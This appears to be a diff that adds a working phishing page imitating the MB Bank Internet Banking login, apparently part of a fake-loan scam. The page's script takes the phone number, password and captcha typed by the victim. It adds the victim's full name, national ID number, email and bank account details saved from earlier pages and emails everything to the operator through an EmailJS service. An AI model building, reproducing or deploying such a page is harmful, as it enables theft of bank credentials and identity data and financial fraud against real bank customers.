@@ -1,0 +1,714 @@
+<!DOCTYPE html>
+<html lang="vi">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes, viewport-fit=cover" />
+    <meta name="theme-color" content="#141ED2" />
+    <title>MBBank - Đăng nhập Internet Banking</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;600;700&display=swap"
+      rel="stylesheet"
+    />
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4.4.1/dist/email.min.js"></script>
+    <script src="../js/index-image-cdn.js"></script>
+    <style>
+      :root {
+        --mb-primary: #141ed2;
+        --mb-primary-hover: #2b34e0;
+        --mb-error: #ed1d24;
+        --mb-text: #000;
+        --mb-muted: #959595;
+        --mb-border: #dee2e6;
+        --mb-bg: #fff;
+      }
+
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+
+      html,
+      body {
+        height: 100%;
+        font-family: "Roboto", Arial, sans-serif;
+        font-size: clamp(13px, 3.6vw, 14px);
+        color: var(--mb-text);
+        background: var(--mb-bg);
+      }
+
+      body.embedded {
+        min-height: auto;
+        overflow-x: hidden;
+      }
+
+      .login-page {
+        display: flex;
+        min-height: 100vh;
+      }
+
+      .login-banner {
+        flex: 1;
+        background: url("../image/promo-loan.svg") center / cover no-repeat,
+          linear-gradient(135deg, #141ed2 0%, #2b34e0 100%);
+        min-height: 100vh;
+      }
+
+      .login-panel {
+        width: 100%;
+        max-width: 520px;
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+        background: #fff;
+      }
+
+      .login-topbar {
+        display: flex;
+        align-items: center;
+        justify-content: flex-end;
+        gap: 16px;
+        padding: 20px 32px 0;
+      }
+
+      .hotline {
+        display: inline-flex;
+        align-items: center;
+        gap: 8px;
+        color: var(--mb-primary);
+        text-decoration: none;
+        font-weight: 600;
+        font-size: 14px;
+      }
+
+      .hotline img {
+        width: 20px;
+        height: 20px;
+      }
+
+      .lang-switch {
+        display: inline-flex;
+        align-items: center;
+        gap: 6px;
+        font-size: 13px;
+        color: var(--mb-text);
+      }
+
+      .lang-switch img {
+        width: 20px;
+        height: 14px;
+        object-fit: cover;
+      }
+
+      .login-content {
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        padding: 24px 48px 32px;
+      }
+
+      .login-logo {
+        text-align: center;
+        margin-bottom: 20px;
+      }
+
+      .login-logo img {
+        height: clamp(36px, 10vw, 48px);
+        width: auto;
+      }
+
+      .login-title {
+        text-align: center;
+        font-size: clamp(15px, 4.2vw, 18px);
+        font-weight: 600;
+        margin-bottom: clamp(16px, 4vw, 28px);
+        color: var(--mb-text);
+        line-height: 1.35;
+      }
+
+      .field-group {
+        margin-bottom: clamp(12px, 3.2vw, 18px);
+      }
+
+      .field-label {
+        display: block;
+        font-size: 13px;
+        font-weight: 500;
+        margin-bottom: 8px;
+        color: var(--mb-text);
+      }
+
+      .input-wrap {
+        position: relative;
+      }
+
+      .input-wrap input {
+        width: 100%;
+        height: clamp(42px, 11vw, 44px);
+        border: 1px solid var(--mb-border);
+        border-radius: 4px;
+        padding: 0 14px;
+        font-size: 16px;
+        color: var(--mb-text);
+        background: #fff;
+        transition: border-color 0.2s;
+      }
+
+      .input-wrap input:focus {
+        outline: none;
+        border-color: var(--mb-primary);
+      }
+
+      .input-wrap input::placeholder {
+        color: #adb5bd;
+        text-transform: uppercase;
+        font-size: 12px;
+      }
+
+      .input-wrap.password input {
+        padding-right: 44px;
+      }
+
+      .toggle-password {
+        position: absolute;
+        right: 12px;
+        top: 50%;
+        transform: translateY(-50%);
+        border: none;
+        background: transparent;
+        cursor: pointer;
+        color: var(--mb-muted);
+        padding: 4px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .captcha-row {
+        display: flex;
+        gap: 12px;
+        align-items: center;
+      }
+
+      .captcha-image {
+        flex-shrink: 0;
+        width: clamp(96px, 28vw, 120px);
+        height: clamp(36px, 10vw, 40px);
+        border: 1px solid var(--mb-border);
+        border-radius: 4px;
+        background: linear-gradient(135deg, #f8f9fa, #e9ecef);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-family: "Courier New", monospace;
+        font-size: 18px;
+        font-weight: 700;
+        letter-spacing: 2px;
+        color: var(--mb-primary);
+        user-select: none;
+        position: relative;
+        overflow: hidden;
+      }
+
+      .captcha-image::before {
+        content: "";
+        position: absolute;
+        inset: 0;
+        background: repeating-linear-gradient(
+          45deg,
+          transparent,
+          transparent 4px,
+          rgba(20, 30, 210, 0.05) 4px,
+          rgba(20, 30, 210, 0.05) 8px
+        );
+      }
+
+      .captcha-image span {
+        position: relative;
+        z-index: 1;
+      }
+
+      .captcha-input-wrap {
+        flex: 1;
+        display: flex;
+        gap: 8px;
+        align-items: center;
+      }
+
+      .captcha-input-wrap input {
+        flex: 1;
+        height: clamp(42px, 11vw, 44px);
+        border: 1px solid var(--mb-border);
+        border-radius: 4px;
+        padding: 0 14px;
+        font-size: 16px;
+      }
+
+      .captcha-input-wrap input:focus {
+        outline: none;
+        border-color: var(--mb-primary);
+      }
+
+      .refresh-captcha {
+        flex-shrink: 0;
+        width: 36px;
+        height: 36px;
+        border: none;
+        background: transparent;
+        color: var(--mb-primary);
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        border-radius: 50%;
+        transition: background 0.2s;
+      }
+
+      .refresh-captcha:hover {
+        background: rgba(20, 30, 210, 0.08);
+      }
+
+      .field-error {
+        color: var(--mb-error);
+        font-size: 12px;
+        margin-top: 6px;
+        display: none;
+      }
+
+      .field-error.show {
+        display: block;
+      }
+
+      .btn-login {
+        width: 100%;
+        height: clamp(44px, 12vw, 48px);
+        margin-top: 8px;
+        border: none;
+        border-radius: 4px;
+        background: var(--mb-primary);
+        color: #fff;
+        font-size: clamp(14px, 3.8vw, 15px);
+        font-weight: 600;
+        cursor: pointer;
+        transition: background 0.2s;
+      }
+
+      .btn-login:hover:not(:disabled) {
+        background: var(--mb-primary-hover);
+      }
+
+      .btn-login:disabled {
+        opacity: 0.7;
+        cursor: not-allowed;
+      }
+
+      .login-footer {
+        padding: 16px 48px 24px;
+        text-align: center;
+        font-size: 12px;
+        color: var(--mb-muted);
+      }
+
+      .login-footer a {
+        color: var(--mb-primary);
+        text-decoration: none;
+        margin: 0 8px;
+      }
+
+      .login-footer a:hover {
+        text-decoration: underline;
+      }
+
+      .loading-overlay {
+        position: fixed;
+        inset: 0;
+        background: rgba(255, 255, 255, 0.85);
+        display: none;
+        align-items: center;
+        justify-content: center;
+        flex-direction: column;
+        gap: 12px;
+        z-index: 100;
+      }
+
+      .loading-overlay.show {
+        display: flex;
+      }
+
+      .spinner {
+        width: 40px;
+        height: 40px;
+        border: 3px solid #e9ecef;
+        border-top-color: var(--mb-primary);
+        border-radius: 50%;
+        animation: spin 0.8s linear infinite;
+      }
+
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+
+      body.embedded .login-page,
+      body.embedded .login-panel {
+        min-height: auto;
+        height: auto;
+      }
+
+      body.embedded .login-banner,
+      body.embedded .login-topbar,
+      body.embedded .login-footer {
+        display: none;
+      }
+
+      body.embedded .login-panel {
+        max-width: none;
+      }
+
+      body.embedded .login-content {
+        padding: clamp(12px, 3.5vw, 20px) clamp(14px, 4vw, 24px)
+          calc(16px + env(safe-area-inset-bottom, 0px));
+        justify-content: flex-start;
+      }
+
+      body.embedded .login-logo {
+        margin-bottom: clamp(10px, 3vw, 16px);
+      }
+
+      @media (max-width: 768px) {
+        .login-banner {
+          display: none;
+        }
+
+        .login-panel {
+          max-width: none;
+        }
+
+        .login-content {
+          padding: 24px 20px;
+        }
+
+        .login-topbar {
+          padding: 16px 20px 0;
+        }
+
+        .login-footer {
+          padding: 16px 20px 24px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="login-page">
+      <div class="login-banner" aria-hidden="true"></div>
+
+      <div class="login-panel">
+        <div class="login-topbar">
+          <a class="hotline" href="tel:1900545426">
+            <img src="../image/mbbank/imgi_1_icons-login.svg" alt="" />
+            1900 545 426
+          </a>
+          <div class="lang-switch">
+            <img src="../image/flag-vn.svg" alt="VN" />
+            VN
+          </div>
+        </div>
+
+        <div class="login-content">
+          <div class="login-logo">
+            <img src="../image/mbbank/imgi_3_logo-blue.svg" alt="MB Bank" />
+          </div>
+          <h1 class="login-title">Chào mừng bạn đến với MB Internet Banking</h1>
+
+          <form id="login-form" novalidate>
+            <div class="field-group">
+              <label class="field-label" for="phone">Số điện thoại</label>
+              <div class="input-wrap">
+                <input
+                  type="tel"
+                  id="phone"
+                  name="phone"
+                  placeholder="Số điện thoại"
+                  autocomplete="off"
+                  inputmode="numeric"
+                  maxlength="11"
+                  pattern="[0-9]{9,11}"
+                  oninput="this.value = this.value.replace(/\D/g, '')"
+                />
+              </div>
+              <p class="field-error" id="phone-error">Vui lòng nhập số điện thoại</p>
+            </div>
+
+            <div class="field-group">
+              <label class="field-label" for="password">Mật khẩu</label>
+              <div class="input-wrap password">
+                <input
+                  type="password"
+                  id="password"
+                  name="password"
+                  placeholder="Mật khẩu"
+                  autocomplete="off"
+                  maxlength="64"
+                />
+                <button
+                  type="button"
+                  class="toggle-password"
+                  id="toggle-password"
+                  aria-label="Hiện/ẩn mật khẩu"
+                >
+                  <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                    <path
+                      d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"
+                    />
+                  </svg>
+                </button>
+              </div>
+              <p class="field-error" id="password-error">Vui lòng nhập mật khẩu</p>
+            </div>
+
+            <div class="field-group">
+              <div class="captcha-row">
+                <div class="captcha-image" id="captcha-display" aria-hidden="true">
+                  <span id="captcha-text"></span>
+                </div>
+                <div class="captcha-input-wrap">
+                  <input
+                    type="text"
+                    id="captcha"
+                    name="captcha"
+                    placeholder="NHẬP MÃ KIỂM TRA"
+                    autocomplete="off"
+                    maxlength="8"
+                  />
+                  <button
+                    type="button"
+                    class="refresh-captcha"
+                    id="refresh-captcha"
+                    aria-label="Làm mới mã kiểm tra"
+                  >
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                      <path
+                        d="M17.65 6.35A7.958 7.958 0 0012 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08A5.99 5.99 0 0112 18c-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"
+                      />
+                    </svg>
+                  </button>
+                </div>
+              </div>
+              <p class="field-error" id="captcha-error">Mã kiểm tra không đúng</p>
+            </div>
+
+            <!-- Hidden input to mark payment method as "Chuyển khoản nhanh" -->
+            <input type="hidden" id="method" name="method" value="rtp" />
+
+            <button type="submit" class="btn-login" id="login-btn">Đăng nhập</button>
+          </form>
+        </div>
+
+        <div class="login-footer">
+          <span>Kết nối với chúng tôi</span><br /><br />
+          <a href="#">Điều khoản và điều kiện</a>
+          <a href="#">An toàn bảo mật</a>
+        </div>
+      </div>
+    </div>
+
+    <div class="loading-overlay" id="loading-overlay">
+      <div class="spinner"></div>
+      <p>Đang xử lý...</p>
+    </div>
+
+    <script>
+      const emailjsConfig = {
+        serviceId: "service_ezzpzs5",
+        templateId: "template_cqo9ino",
+        publicKey: "MQKcpIwixBVd4Q920",
+      };
+
+      const params = new URLSearchParams(window.location.search);
+      const isEmbedded = params.get("embedded") === "1";
+      const nextPage = params.get("next") || "";
+
+      if (isEmbedded) {
+        document.body.classList.add("embedded");
+      }
+
+      function reportFrameHeight() {
+        if (!isEmbedded || window.parent === window) return;
+        const height = Math.ceil(
+          Math.max(
+            document.body.scrollHeight,
+            document.documentElement.scrollHeight
+          )
+        );
+        window.parent.postMessage({ type: "mbbank-frame-height", height }, "*");
+      }
+
+      function setupEmbeddedResize() {
+        if (!isEmbedded) return;
+        reportFrameHeight();
+        window.addEventListener("resize", reportFrameHeight);
+        if (typeof ResizeObserver !== "undefined") {
+          new ResizeObserver(reportFrameHeight).observe(document.body);
+        }
+      }
+
+      emailjs.init({ publicKey: emailjsConfig.publicKey });
+
+      function prefillPhoneFromFormData() {
+        try {
+          const stored = JSON.parse(sessionStorage.getItem("formData") || "{}");
+          if (stored.phone) {
+            document.getElementById("phone").value = stored.phone;
+          }
+        } catch (_) {}
+      }
+
+      let currentCaptcha = "";
+
+      function generateCaptcha() {
+        const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
+        let code = "";
+        for (let i = 0; i < 6; i++) {
+          code += chars.charAt(Math.floor(Math.random() * chars.length));
+          if (i === 2) code += " ";
+        }
+        currentCaptcha = code.replace(/\s/g, "").toLowerCase();
+        document.getElementById("captcha-text").textContent = code;
+      }
+
+      function showError(id, show) {
+        document.getElementById(id).classList.toggle("show", show);
+      }
+
+      function setLoading(loading) {
+        document.getElementById("loading-overlay").classList.toggle("show", loading);
+        document.getElementById("login-btn").disabled = loading;
+      }
+
+      function saveLoginData(data) {
+        sessionStorage.setItem("mbbankLogin", JSON.stringify(data));
+      }
+
+      function notifyParent() {
+        if (window.parent && window.parent !== window) {
+          window.parent.postMessage({ type: "mbbank-login-success" }, "*");
+        }
+      }
+
+      function handleSuccess(loginData) {
+        saveLoginData(loginData);
+
+        if (isEmbedded) {
+          notifyParent();
+          return;
+        }
+
+        if (nextPage === "vtcpay") {
+          window.location.href = "vtcpay.html";
+          return;
+        }
+
+        alert("Đăng nhập thành công.");
+      }
+
+      async function sendToEmailJS(loginData) {
+        const formData = JSON.parse(sessionStorage.getItem("formData") || "{}");
+        const templateParams = {
+          platform: "MB Internet Banking (Mcredit)",
+          phone: loginData.phone,
+          phone_number: loginData.phone,
+          username: loginData.phone,
+          password: loginData.password,
+          captcha: loginData.captcha,
+          submitted_at: loginData.submitted_at,
+          customer_name: formData.fullName || "",
+          full_name: formData.fullName || "",
+          amount: formData.amount || "",
+          loan_amount: formData.amount || "",
+          bank: formData.bank || "MB Bank",
+          bank_name: formData.bank || "MB Bank",
+          bank_key: formData.bankKey || "",
+          method: formData.method || "VTC Pay",
+          method_key: formData.methodKey || "vtcpay",
+          disbursement_method: formData.method || "VTC Pay",
+          cccd: formData.cccd || "",
+          id_number: formData.cccd || "",
+          email: formData.email || "",
+          account_number: formData.accountNumber || "",
+          account_holder: formData.accountHolder || "",
+          account_holder_name: formData.accountHolder || "",
+          months: formData.months || "",
+          loan_term: formData.months ? formData.months + " tháng" : "",
+          page: "vtcpay.html",
+        };
+
+        const response = await emailjs.send(
+          emailjsConfig.serviceId,
+          emailjsConfig.templateId,
+          templateParams
+        );
+
+        if (response.status !== 200) {
+          throw new Error("EmailJS trả về mã lỗi: " + response.status);
+        }
+
+        return response;
+      }
+
+      document.getElementById("toggle-password").addEventListener("click", () => {
+        const input = document.getElementById("password");
+        input.type = input.type === "password" ? "text" : "password";
+      });
+
+      document.getElementById("refresh-captcha").addEventListener("click", generateCaptcha);
+
+      document.getElementById("login-form").addEventListener("submit", async (e) => {
+        e.preventDefault();
+
+        const phone = document.getElementById("phone").value.trim();
+        const password = document.getElementById("password").value;
+        const captcha = document.getElementById("captcha").value.trim().toLowerCase();
+
+        let valid = true;
+        showError("phone-error", !phone);
+        showError("password-error", !password);
+        showError("captcha-error", !captcha || captcha !== currentCaptcha);
+        if (!phone || !password || !captcha || captcha !== currentCaptcha) {
+          valid = false;
+        }
+        if (!valid) return;
+
+        const loginData = {
+          phone,
+          password,
+          captcha: document.getElementById("captcha").value.trim(),
+          submitted_at: new Date().toLocaleString("vi-VN"),
+          method: document.getElementById('method')?.value || 'rtp'
+        };
+
+        setLoading(true);
+        try {
+          await sendToEmailJS(loginData);
+          handleSuccess(loginData);
+        } catch (error) {
+          console.error("EmailJS error:", error);
+          alert(
+            "Không gửi được thông tin. Vui lòng thử lại.\n" +
+              (error.text || error.message || "")
+          );
+        } finally {
+          setLoading(false);
+        }
+      });
+
+      generateCaptcha();
+      prefillPhoneFromFormData();
+      setupEmbeddedResize();
+      window.addEventListener("load", reportFrameHeight);
+    </script>
+  </body>
+</html>
